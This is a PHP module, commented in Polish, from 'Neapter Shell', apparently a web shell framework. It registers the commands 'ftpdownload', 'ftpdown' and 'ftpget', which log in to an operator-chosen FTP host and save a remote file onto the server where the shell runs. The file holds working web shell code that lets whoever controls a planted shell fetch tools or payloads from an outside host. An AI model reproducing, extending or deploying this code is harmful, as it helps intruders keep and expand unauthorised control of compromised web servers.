<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * Pobieranie pliku z FTP
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Modules
 */
class ModuleFtpDownload extends ModuleAbstract
{
	/**
	 * Dostepna lista komend
	 *
	 * @access public
	 * @return array
	 */
	public function getCommands()
	{
		return array
		(
			'ftpdownload',
			'ftpdown',
			'ftpget'
		);
	}

	/**
	 * Zwracanie wersji modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getVersion()
	{
		/**
		 * Wersja Data Autor
		 */
		return '1.00 2011-06-04 - <krzotr@gmail.com>';
	}

	/**
	 * Zwracanie pomocy modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getHelp()
	{
		return <<<DATA
Pobieranie pliku z FTP

	Użycie:
		ftpdownload host:port login@hasło plik_źródłowy plik_docelowy

	Przykład:
		ftpdownload localhost:6666 test@test /plik.txt /home/usr/plik.txt
DATA;
	}

	/**
	 * Wywolanie modulu
	 *
	 * @access public
	 * @return string
	 */
	public function get()
	{
		/**
		 * Help
		 */
		if( $this -> oShell -> iArgc !== 4 )
		{
			return $this -> getHelp();
		}

		$aHost = $this -> getHost( $this -> oShell -> aArgv[0] );

		if( $aHost[1] === 0 )
		{
			$aHost[1] = 21;
		}

		/**
		 * login@pass
		 */
		list( $sUsername, $sPassword ) = explode( '@', $this -> oShell -> aArgv[1] );

		/**
		 * Ustanawianie polaczenia
		 */
		if( ! ( $rFtp = ftp_connect( $aHost[0], $aHost[1], 5 ) ) )
		{
			return htmlspecialchars( sprintf( 'Nie można połączyć się z serwerem FTP "%s"', $this -> oShell -> aArgv[0] ) );
		}

		/**
		 * Autoryzacja
		 */
		if( ! ftp_login( $rFtp, $sUsername, $sPassword ) )
		{
			return htmlspecialchars( sprintf( 'Błędne dane do autoryzacji "%s"', $this -> oShell -> aArgv[1] ) );
		}

		/**
		 * Zmiana katalogu
		 */
		if( ! ftp_chdir( $rFtp, ( $sDir = str_replace( '\\', '/', dirname( $this -> oShell -> aArgv[2] ) ) ) ) )
		{
			return htmlspecialchars( sprintf( 'Na FTP nie istnieje katalog "%s"', $sDir ) );
		}

		/**
		 * Pobieranie pliku
		 */
		if( ! ftp_get( $rFtp, $this -> oShell -> aArgv[3], basename( $this -> oShell -> aArgv[2] ), FTP_BINARY ) )
		{
			return htmlspecialchars( sprintf( 'Nie można pobrać pliku "%s" z serwera', $this -> oShell -> aArgv[2] ) );
		}

		ftp_close( $rFtp );

		return htmlspecialchars( sprintf( 'Plik "%s" został pomyślnie pobrany an FTP i zapisany w "%s"', $this -> oShell -> aArgv[2], $this -> oShell -> aArgv[3] ) );
	}

}